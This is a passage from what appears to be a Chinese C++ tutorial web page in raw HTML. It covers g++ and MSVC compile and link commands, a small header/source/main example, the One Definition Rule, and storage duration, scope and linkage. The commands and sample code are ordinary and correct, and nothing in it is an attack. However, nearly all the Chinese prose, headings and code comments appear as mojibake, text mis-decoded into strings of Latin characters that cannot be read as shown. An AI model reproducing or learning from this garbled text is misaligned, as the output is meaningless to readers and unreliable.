ï¼Œä½†å¯èƒ½è¿˜åŒ…å«å¯¹å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°æˆ–å˜é‡çš„å¼•ç”¨ã€‚</li></ul></li></ol><h3 id="ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹"><a href="#ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹"></a>ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹</h3><p>åœ¨C++ä¸­ï¼Œå°†æºä»£ç è½¬æ¢ä¸ºå¯æ‰§è¡Œç¨‹åºé€šå¸¸åˆ†ä¸ºç¼–è¯‘å’Œé“¾æ¥ä¸¤ä¸ªä¸»è¦é˜¶æ®µã€‚è®©æˆ‘ä»¬çœ‹çœ‹è¿™äº›è¿‡ç¨‹ä¸­æ¶‰åŠçš„å…·ä½“å‘½ä»¤ï¼š</p><h4 id="ç¼–è¯‘å‘½ä»¤"><a href="#ç¼–è¯‘å‘½ä»¤" class="headerlink" title="ç¼–è¯‘å‘½ä»¤"></a>ç¼–è¯‘å‘½ä»¤</h4><p>ä½¿ç”¨g++ï¼ˆGNU C++ ç¼–è¯‘å™¨ï¼‰:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ç¼–è¯‘å•ä¸ªæºæ–‡ä»¶</span></span><br><span class="line">g++ -c utils.cpp     <span class="comment"># ç”Ÿæˆ utils.o ç›®æ ‡æ–‡ä»¶</span></span><br><span class="line">g++ -c main.cpp      <span class="comment"># ç”Ÿæˆ main.o ç›®æ ‡æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## æ·»åŠ ä¼˜åŒ–é€‰é¡¹</span></span><br><span class="line">g++ -c -O2 utils.cpp <span class="comment"># ä½¿ç”¨O2çº§åˆ«çš„ä¼˜åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## æ·»åŠ è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">g++ -c -g utils.cpp  <span class="comment"># åŒ…å«è°ƒè¯•ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨MSVCï¼ˆMicrosoft Visual C++ï¼‰:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ç¼–è¯‘å•ä¸ªæºæ–‡ä»¶</span></span><br><span class="line">cl /c utils.cpp      <span class="comment"># ç”Ÿæˆ utils.obj ç›®æ ‡æ–‡ä»¶</span></span><br><span class="line">cl /c main.cpp       <span class="comment"># ç”Ÿæˆ main.obj ç›®æ ‡æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## æ·»åŠ ä¼˜åŒ–é€‰é¡¹</span></span><br><span class="line">cl /c /O2 utils.cpp  <span class="comment"># ä½¿ç”¨O2çº§åˆ«çš„ä¼˜åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## æ·»åŠ è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">cl /c /Zi utils.cpp  <span class="comment"># åŒ…å«è°ƒè¯•ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><h4 id="é“¾æ¥å‘½ä»¤"><a href="#é“¾æ¥å‘½ä»¤" class="headerlink" title="é“¾æ¥å‘½ä»¤"></a>é“¾æ¥å‘½ä»¤</h4><p>ä½¿ç”¨g++:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## é“¾æ¥ç›®æ ‡æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span></span><br><span class="line">g++ main.o utils.o -o myprogram</span><br><span class="line"></span><br><span class="line"><span class="comment">## é“¾æ¥å¹¶æŒ‡å®šåº“æ–‡ä»¶</span></span><br><span class="line">g++ main.o utils.o -lmath -o myprogram</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨MSVC:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## é“¾æ¥ç›®æ ‡æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span></span><br><span class="line">link main.obj utils.obj /OUT:myprogram.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">## é“¾æ¥å¹¶æŒ‡å®šåº“æ–‡ä»¶</span></span><br><span class="line">link main.obj utils.obj math.lib /OUT:myprogram.exe</span><br></pre></td></tr></table></figure><h4 id="ä¸€æ­¥å®Œæˆç¼–è¯‘å’Œé“¾æ¥"><a href="#ä¸€æ­¥å®Œæˆç¼–è¯‘å’Œé“¾æ¥" class="headerlink" title="ä¸€æ­¥å®Œæˆç¼–è¯‘å’Œé“¾æ¥"></a>ä¸€æ­¥å®Œæˆç¼–è¯‘å’Œé“¾æ¥</h4><p>é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªå‘½ä»¤ä¸­å®Œæˆç¼–è¯‘å’Œé“¾æ¥:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ä½¿ç”¨g++</span></span><br><span class="line">g++ main.cpp utils.cpp -o myprogram</span><br><span class="line"></span><br><span class="line"><span class="comment">## ä½¿ç”¨MSVC</span></span><br><span class="line">cl main.cpp utils.cpp /Fe:myprogram.exe</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¤„ç†ä¸­é—´æ­¥éª¤ï¼Œç”Ÿæˆå¿…è¦çš„ç›®æ ‡æ–‡ä»¶ï¼Œç„¶åé“¾æ¥å®ƒä»¬åˆ›å»ºæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>ä¸€ä¸ªåŒ…å«å¤šä¸ªæ–‡ä»¶çš„ C++ é¡¹ç›®çš„å…¸å‹æ„å»ºè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li><strong>ç¼–è¯‘ (Compilation):</strong> ç¼–è¯‘å™¨åˆ†åˆ«å¤„ç†æ¯ä¸ª <code>.cpp</code> æºæ–‡ä»¶ã€‚å¯¹äºæ¯ä¸ª <code>.cpp</code> æ–‡ä»¶ï¼š<ul><li>  é¢„å¤„ç†å™¨å¤„ç† <code>#include</code> æŒ‡ä»¤ï¼Œå°†å¤´æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æºæ–‡ä»¶ä¸­ã€‚</li><li>  ç¼–è¯‘å™¨å°†å¤„ç†åçš„æºä»£ç ç¿»è¯‘æˆæœºå™¨ç ï¼Œç”Ÿæˆä¸€ä¸ªç›®æ ‡æ–‡ä»¶ (<code>.obj</code> æˆ– <code>.o</code>)ã€‚</li></ul></li><li><strong>é“¾æ¥ (Linking):</strong> <strong>é“¾æ¥å™¨ (Linker)</strong> å°†æ‰€æœ‰ç”±ç¼–è¯‘å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä»¥åŠå¯èƒ½éœ€è¦çš„åº“æ–‡ä»¶ï¼ˆåŒ…å«é¢„ç¼–è¯‘ä»£ç ï¼Œå¦‚æ ‡å‡†åº“ï¼‰ç»„åˆåœ¨ä¸€èµ·ã€‚<ul><li>  é“¾æ¥å™¨è´Ÿè´£è§£æç›®æ ‡æ–‡ä»¶ä¹‹é—´çš„äº¤å‰å¼•ç”¨ï¼ˆä¾‹å¦‚ï¼Œ<code>main.cpp</code> è°ƒç”¨äº†åœ¨ <code>utils.cpp</code> ä¸­å®šä¹‰çš„å‡½æ•°ï¼‰ã€‚</li><li>  å¦‚æœæ‰€æœ‰å¼•ç”¨éƒ½èƒ½æ‰¾åˆ°å¯¹åº”çš„å®šä¹‰ï¼Œå¹¶ä¸”æ²¡æœ‰é‡å®šä¹‰ç­‰é”™è¯¯ï¼Œé“¾æ¥å™¨å°±ä¼šç”Ÿæˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚ <code>.exe</code> æ–‡ä»¶ï¼‰ã€‚</li></ul></li></ol><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>å‡è®¾æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„é¡¹ç›®ï¼ŒåŒ…å«ä¸€ä¸ªè®¡ç®—åŠŸèƒ½çš„å·¥å…·å‡½æ•°ã€‚</p><p><strong>1. å¤´æ–‡ä»¶ (<code>utils.h</code>)</strong></p><p>åŒ…å«å‡½æ•°å£°æ˜å’ŒåŒ…å«å«å“¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\utils.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UTILS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UTILS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ (å£°æ˜)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// UTILS_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>2. æºæ–‡ä»¶ (<code>utils.cpp</code>)</strong></p><p>åŒ…å«å‡½æ•°çš„å…·ä½“å®ç°ã€‚å®ƒéœ€è¦åŒ…å«è‡ªå·±çš„å¤´æ–‡ä»¶ä»¥ç¡®ä¿å£°æ˜å’Œå®šä¹‰åŒ¹é…ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\utils.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;utils.h&quot;</span> <span class="comment">// åŒ…å«å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ (å®ç°)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3. ä¸»ç¨‹åºæ–‡ä»¶ (<code>main.cpp</code>)</strong></p><p>ä½¿ç”¨ <code>utils.h</code> ä¸­å£°æ˜çš„å‡½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;utils.h&quot;</span> <span class="comment">// åŒ…å«å¤´æ–‡ä»¶ä»¥ä½¿ç”¨ add å‡½æ•°</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> y = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = add(x, y); <span class="comment">// è°ƒç”¨åœ¨ utils.cpp ä¸­å®šä¹‰çš„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The sum of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ„å»ºè¿‡ç¨‹:</strong></p><ol><li> <strong>ç¼–è¯‘ <code>utils.cpp</code>:</strong> <code>compiler utils.cpp -&gt; utils.obj</code></li><li> <strong>ç¼–è¯‘ <code>main.cpp</code>:</strong> <code>compiler main.cpp -&gt; main.obj</code></li><li> <strong>é“¾æ¥:</strong> <code>linker main.obj utils.obj -&gt; myprogram.exe</code> (æˆ–ç±»ä¼¼åç§°)</li></ol><p><strong>å£°æ˜ vs. å®šä¹‰:</strong></p><p>ç†è§£å£°æ˜å’Œå®šä¹‰çš„åŒºåˆ«å¯¹äºå•ç‹¬ç¼–è¯‘è‡³å…³é‡è¦ï¼š</p><ul><li>  <strong>å£°æ˜ (Declaration):</strong> å‘Šè¯‰ç¼–è¯‘å™¨æŸä¸ªä¸œè¥¿ï¼ˆå‡½æ•°ã€å˜é‡ã€ç±»ç­‰ï¼‰çš„å­˜åœ¨åŠå…¶æ¥å£ï¼ˆåç§°ã€ç±»å‹ã€å‚æ•°ç­‰ï¼‰ã€‚ä¸€ä¸ªå£°æ˜å¯ä»¥å‡ºç°å¤šæ¬¡ï¼ˆåªè¦å®ƒä»¬ä¸€è‡´ï¼‰ã€‚å¤´æ–‡ä»¶ä¸»è¦åŒ…å«å£°æ˜ã€‚</li><li>  <strong>å®šä¹‰ (Definition):</strong> æä¾›äº†æŸä¸ªä¸œè¥¿çš„å…·ä½“å®ç°æˆ–å†…å­˜åˆ†é…ã€‚å¯¹äºéå†…è”å‡½æ•°å’Œéé™æ€æ•°æ®æˆå‘˜ï¼Œ<strong>ä¸€ä¸ªå®šä¹‰åœ¨ä¸€ä¸ªç¨‹åºä¸­åªèƒ½å‡ºç°ä¸€æ¬¡</strong>ï¼ˆ<strong>å•ä¸€å®šä¹‰è§„åˆ™ - One Definition Rule, ODR</strong>ï¼‰ã€‚æºæ–‡ä»¶ä¸»è¦åŒ…å«å®šä¹‰ã€‚</li></ul><p>å¤´æ–‡ä»¶å……å½“äº†ä¸åŒæºæ–‡ä»¶ä¹‹é—´çš„â€œå¥‘çº¦â€ï¼Œç¡®ä¿å®ƒä»¬å¯¹å…±äº«çš„å‡½æ•°å’Œç±»æœ‰å…±åŒçš„ç†è§£ï¼Œè€Œé“¾æ¥å™¨åˆ™è´Ÿè´£å°†è¿™äº›éƒ¨åˆ†æœ€ç»ˆç»„è£…åœ¨ä¸€èµ·ã€‚</p><h2 id="9-2-å­˜å‚¨æŒç»­æ€§ã€ä½œç”¨åŸŸå’Œé“¾æ¥æ€§"><a href="#9-2-å­˜å‚¨æŒç»­æ€§ã€ä½œç”¨åŸŸå’Œé“¾æ¥æ€§" class="headerlink" title="9.2 å­˜å‚¨æŒç»­æ€§ã€ä½œç”¨åŸŸå’Œé“¾æ¥æ€§"></a>9.2 å­˜å‚¨æŒç»­æ€§ã€ä½œç”¨åŸŸå’Œé“¾æ¥æ€§</h2><p>C++ ä½¿ç”¨å¤šç§æ–¹æ¡ˆæ¥ç®¡ç†å†…å­˜ä¸­çš„æ•°æ®ã€‚äº†è§£è¿™äº›æ–¹æ¡ˆå¯¹äºç†è§£å˜é‡å’Œå‡½æ•°çš„ç”Ÿå‘½å‘¨æœŸã€å¯è§æ€§ä»¥åŠå®ƒä»¬å¦‚ä½•åœ¨ä¸åŒæ–‡ä»¶é—´å…±äº«è‡³å…³é‡è¦ã€‚ä¸»è¦æ¶‰åŠä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼š</p><ol><li> <strong>å­˜å‚¨æŒç»­æ€§ (Storage Duration):</strong> å†³å®šäº†å¯¹è±¡ï¼ˆå˜é‡ï¼‰åœ¨å†…å­˜ä¸­ä¿ç•™å¤šé•¿æ—¶é—´ã€‚</li><li> <strong>ä½œç”¨åŸŸ (Scope):</strong> æè¿°äº†æ ‡è¯†ç¬¦ï¼ˆå˜é‡åã€å‡½æ•°åç­‰ï¼‰åœ¨ç¨‹åºä»£ç ä¸­çš„å¯è§èŒƒå›´ã€‚</li><li> <strong>é“¾æ¥æ€§ (Linkage):</strong> å†³å®šäº†åœ¨ä¸åŒç¼–è¯‘å•å…ƒï¼ˆ<code>.cpp</code> æ–‡ä»¶ï¼‰ä¸­å£°æ˜çš„åŒåæ ‡è¯†ç¬¦æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå®ä½“ã€‚</li></ol><p>C++ ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§å­˜å‚¨æŒç»­æ€§ï¼š</p><ul><li>  <strong>è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§ (Automatic Storage Duration):</strong> å¯¹è±¡åœ¨ç¨‹åºæ‰§è¡Œè¿›å…¥å…¶å®šä¹‰æ‰€åœ¨çš„ä»£ç å—æ—¶åˆ›å»ºï¼Œåœ¨é€€å‡ºè¯¥ä»£ç å—æ—¶é”€æ¯ã€‚é€šå¸¸åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡ï¼ˆé <code>static</code>ï¼‰å±äºè¿™ç§ã€‚å†…å­˜é€šå¸¸åœ¨æ ˆ (stack) ä¸Šåˆ†é…ã€‚</li><li>  <strong>é™æ€å­˜å‚¨æŒç»­æ€§ (Static Storage Duration):</strong> å¯¹è±¡åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼ˆæˆ–é¦–æ¬¡ä½¿ç”¨å‰ï¼‰ï¼Œåœ¨æ•´ä¸ªç¨‹åºè¿è¡ŒæœŸé—´éƒ½å­˜åœ¨ï¼Œç›´åˆ°ç¨‹åºç»“æŸæ—¶æ‰é”€æ¯ã€‚å…¨å±€å˜é‡ã€æ–‡ä»¶ä½œç”¨åŸŸçš„ <code>static</code> å˜é‡ã€å‡½æ•°å†…éƒ¨çš„ <code>static</code> å˜é‡éƒ½å±äºè¿™ç§ã€‚</li><li>  <strong>çº¿ç¨‹å­˜å‚¨æŒç»­æ€§ (Thread Storage Duration) (C++11):</strong> å¯¹è±¡ä¸ç‰¹å®šçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸç»‘å®šã€‚ä½¿ç”¨ <code>thread_local</code> è¯´æ˜ç¬¦å£°æ˜ã€‚</li><li>  <strong>åŠ¨æ€å­˜å‚¨æŒç»­æ€§ (Dynamic Storage Duration):</strong> å¯¹è±¡é€šè¿‡ <code>new</code> è¿ç®—ç¬¦åœ¨ç¨‹åºçš„è‡ªç”±å­˜å‚¨åŒºï¼ˆå †, heapï¼‰ä¸Šæ˜¾å¼åˆ›å»ºï¼Œå¹¶é€šè¿‡ <code>delete</code> è¿ç®—ç¬¦æ˜¾å¼é”€æ¯ã€‚å…¶ç”Ÿå‘½å‘¨æœŸç”±ç¨‹åºå‘˜æ§åˆ¶ã€‚</li></ul><h3 id="9-2-1-ä½œç”¨åŸŸå’Œé“¾æ¥"><a href="#9-2-1-ä½œç”¨åŸŸå’Œé“¾æ¥" class="headerlink" title="9.2.1 ä½œç”¨åŸŸå’Œé“¾æ¥"></a>9.2.1 ä½œç”¨åŸŸå’Œé“¾æ¥</h3><p><strong>ä½œç”¨åŸŸ (Scope)</strong> å®šä¹‰äº†æ ‡è¯†ç¬¦æœ‰æ•ˆçš„ä»£ç åŒºåŸŸã€‚C++ ä¸­çš„ä¸»è¦ä½œç”¨åŸŸåŒ…æ‹¬ï¼š</p><ul><li>  <strong>å—ä½œç”¨åŸŸ (Block Scope):</strong> æ ‡è¯†ç¬¦åœ¨ä»£ç å—ï¼ˆç”± <code>&#123;&#125;</code> åŒ…å›´ï¼‰å†…å¯è§ï¼Œä»å£°æ˜ç‚¹å¼€å§‹åˆ°ä»£ç å—ç»“æŸã€‚å‡½æ•°å†…éƒ¨çš„å˜é‡ã€å¾ªç¯å˜é‡ç­‰å…·æœ‰å—ä½œç”¨åŸŸã€‚</li><li>  <strong>å‡½æ•°ä½œç”¨åŸŸ (Function Scope):</strong> ä»…ç”¨äº <code>goto</code> è¯­å¥çš„æ ‡ç­¾ï¼Œæ ‡ç­¾åœ¨æ•´ä¸ªå‡½æ•°å†…éƒ¨éƒ½å¯è§ã€‚</li><li>  <strong>å‡½æ•°åŸå‹ä½œç”¨åŸŸ (Function Prototype Scope):</strong> å‡½æ•°åŸå‹å‚æ•°åˆ—è¡¨ä¸­çš„æ ‡è¯†ç¬¦ä»…åœ¨åŸå‹å£°æ˜å†…éƒ¨å¯è§ã€‚</li><li>  <strong>æ–‡ä»¶ä½œç”¨åŸŸ (File Scope) / å…¨å±€ä½œç”¨åŸŸ (Global Scope) / åç§°ç©ºé—´ä½œç”¨åŸŸ (Namespace Scope):</strong> åœ¨æ‰€æœ‰å‡½æ•°æˆ–ç±»å¤–éƒ¨å®šä¹‰çš„æ ‡è¯†ç¬¦å…·æœ‰æ–‡ä»¶ä½œç”¨åŸŸï¼ˆæˆ–æ›´å‡†ç¡®åœ°è¯´æ˜¯åç§°ç©ºé—´ä½œç”¨åŸŸï¼Œå…¨å±€ä½œç”¨åŸŸæ˜¯é»˜è®¤çš„å…¨å±€åç§°ç©ºé—´ï¼‰ã€‚å®ƒä»¬ä»å£°æ˜ç‚¹å¼€å§‹åˆ°æ–‡ä»¶æœ«å°¾éƒ½å¯è§ã€‚</li><li>  <strong>ç±»ä½œç”¨åŸŸ (Class Scope):</strong> ç±»æˆå‘˜ï¼ˆæ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°ï¼‰å…·æœ‰ç±»ä½œç”¨åŸŸï¼Œåœ¨ç±»å®šä¹‰å†…éƒ¨ä»¥åŠé€šè¿‡å¯¹è±¡ã€å¼•ç”¨æˆ–æŒ‡é’ˆè®¿é—®æ—¶å¯è§ã€‚</li></ul><p><strong>é“¾æ¥æ€§ (Linkage)</strong> æè¿°äº†åç§°å¦‚ä½•åœ¨ä¸åŒçš„ç¼–è¯‘å•å…ƒï¼ˆ<code>.cpp</code> æ–‡ä»¶ï¼‰ä¹‹é—´å…±äº«ã€‚</p><ul><li>  <strong>æ— é“¾æ¥æ€§ (No Linkage):</strong> åç§°åªåœ¨å®šä¹‰å®ƒçš„ä½œç”¨åŸŸå†…æœ‰æ•ˆï¼Œä¸èƒ½è¢«å…¶ä»–ä½œç”¨åŸŸæˆ–ç¼–è¯‘å•å…ƒè®¿é—®ã€‚å…·æœ‰å—ä½œç”¨åŸŸçš„å˜é‡ï¼ˆåŒ…æ‹¬å‡½æ•°å†…éƒ¨çš„ <code>static</code> å˜é‡ï¼‰é€šå¸¸æ²¡æœ‰é“¾æ¥æ€§ã€‚</li><li>  <strong>å†…éƒ¨é“¾æ¥æ€§ (Internal Linkage):</strong> åç§°å¯ä»¥åœ¨å®šä¹‰å®ƒçš„<strong>å•ä¸ªç¼–è¯‘å•å…ƒ</strong>å†…çš„æ‰€æœ‰ä½œç”¨åŸŸä¸­å…±äº«ï¼Œä½†ä¸èƒ½è¢«å…¶ä»–ç¼–è¯‘å•å…ƒè®¿é—®ã€‚åœ¨æ–‡ä»¶ä½œç”¨åŸŸï¼ˆå…¨å±€æˆ–å‘½åç©ºé—´ï¼‰ä½¿ç”¨ <code>static</code> å…³é”®å­—å£°æ˜çš„å˜é‡å’Œå‡½æ•°ï¼Œä»¥åŠåŒ¿åå‘½åç©ºé—´ä¸­çš„å®ä½“å…·æœ‰å†…éƒ¨é“¾æ¥æ€§ã€‚</li><li>  <strong>å¤–éƒ¨é“¾æ¥æ€§ (External Linkage):</strong> åç§°å¯ä»¥åœ¨<strong>å¤šä¸ªç¼–è¯‘å•å…ƒ</strong>ä¹‹é—´å…±äº«ã€‚åœ¨æ–‡ä»¶ä½œç”¨åŸŸï¼ˆå…¨å±€æˆ–å‘½åç©ºé—´ï¼‰å£°æ˜çš„é <code>static</code> å‡½æ•°ã€é <code>static</code> é <code>const</code> å…¨å±€å˜é‡ã€<code>extern const</code> å…¨å±€å˜é‡ä»¥åŠç±»ç­‰å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§ã€‚</li></ul><h3 id="9-2-2-è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§"><a href="#9-2-2-è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§" class="headerlink" title="9.2.2 è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§"></a>9.2.2 è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§</h3><p>è¿™æ˜¯æœ€å¸¸è§çš„å­˜å‚¨æ–¹å¼ï¼Œé€‚ç”¨äºå‡½æ•°å†…éƒ¨å®šä¹‰çš„å±€éƒ¨å˜é‡ï¼ˆæœªä½¿ç”¨ <code>static</code>ã€<code>extern</code> æˆ– <code>thread_local</code>ï¼‰ã€‚</p><ul><li>  <strong>å­˜å‚¨æŒç»­æ€§:</strong> è‡ªåŠ¨ã€‚è¿›å…¥ä»£ç å—æ—¶åˆ›å»ºï¼Œé€€å‡ºæ—¶é”€æ¯ã€‚</li><li>  <strong>ä½œç”¨åŸŸ:</strong> å—ä½œç”¨åŸŸã€‚</li><li>  <strong>é“¾æ¥æ€§:</strong> æ— é“¾æ¥æ€§ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> auto_var = <span class="number">10</span>; <span class="comment">// è‡ªåŠ¨å˜é‡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside my_func: auto_var = &quot;</span> &lt;&lt; auto_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    auto_var++; <span class="comment">// ä¿®æ”¹åªåœ¨æœ¬æ¬¡è°ƒç”¨æœ‰æ•ˆ</span></span><br><span class="line">&#125; <span class="comment">// auto_var åœ¨è¿™é‡Œè¢«é”€æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> main_var = <span class="number">5</span>; <span class="comment">// main å‡½æ•°çš„è‡ªåŠ¨å˜é‡</span></span><br><span class="line">    <span class="keyword">if</span> (main_var &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">double</span> block_var = <span class="number">3.14</span>; <span class="comment">// å—ä½œç”¨åŸŸçš„è‡ªåŠ¨å˜é‡</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside if block: block_var = &quot;</span> &lt;&lt; block_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// block_var åœ¨è¿™é‡Œè¢«é”€æ¯</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; block_var; // é”™è¯¯ï¼block_var åœ¨æ­¤ä½œç”¨åŸŸä¸å¯è§</span></span><br><span class="line"></span><br><span class="line">    my_func(); <span class="comment">// è°ƒç”¨ my_funcï¼Œåˆ›å»ºå¹¶é”€æ¯å…¶ auto_var</span></span><br><span class="line">    my_func(); <span class="comment">// å†æ¬¡è°ƒç”¨ï¼Œåˆ›å»ºæ–°çš„ auto_varï¼Œå…¶å€¼ä»æ˜¯ 10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-3-é™æ€æŒç»­å˜é‡"><a 